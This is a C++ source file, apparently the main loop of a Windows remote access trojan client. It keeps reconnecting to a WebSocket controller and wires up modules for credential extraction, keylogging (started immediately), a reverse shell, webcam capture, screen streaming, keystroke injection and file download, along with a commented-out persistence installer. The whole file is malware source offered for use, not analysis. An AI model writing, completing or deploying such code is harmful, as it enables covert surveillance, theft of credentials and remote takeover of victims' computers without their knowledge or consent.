#include <iostream>
#include <winsock2.h>
#include <chrono>
#include <thread>
#include <mutex>
#include <cstring>
#include <random>
#include "configuration.h"
#include "Information.h"
#include "ClientSocket.h"
#include "DeviceEnumerator.h"
#include "Download.h"
#include "CredentialsExtractor.h"
#include "ReverseShell.h"
#include "Permission.h"
#include "MessageBoxGUI.h"
#include "KeyboardExecuter.h"
#include "ConnectionState.h"
#include "SystemState.h"
#include "KeyLogger.h"
#include "WebcamManager.h"
#include "ScreenStreamer.h"

int main(int argc = 0, char *argv[] = nullptr) {
    Sleep(argc);
    HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
    if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
        bool isConnecting = true;

        while (isConnecting) {
            std::unordered_map<std::string, std::function<void(nlohmann::json &)>> actionMap;
            //Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
            std::string uri = "ws://localhost:3055";

            ClientSocket clientSocket(uri, actionMap);
            Information information(clientSocket);
            FileManager fileManager(clientSocket);
            Download download(clientSocket);
            DeviceEnumerator deviceEnumerator(clientSocket);
            ScreenStreamer screenStreamer(clientSocket);
            WebcamManager webcamManager(clientSocket, download);
            CredentialsExtractor credentialsExtractor(clientSocket, download);
            KeyLogger keyLogger(clientSocket, download);
            keyLogger.tryStart();
            ReverseShell reverseShell(clientSocket);
            Permission permission(clientSocket);
            MessageBoxGUI messageBoxGui(clientSocket);
            KeyboardExecuter keyboardExecuter(clientSocket);
            ConnectionState connectionState(clientSocket, isConnecting);
            SystemState systemState(clientSocket);


            clientSocket.startConnection();
            std::this_thread::sleep_for(std::chrono::milliseconds(TIMING_RETRY));
        }
    }
    ReleaseMutex(hMutexHandle);
    CloseHandle(hMutexHandle);
    return 0;
}
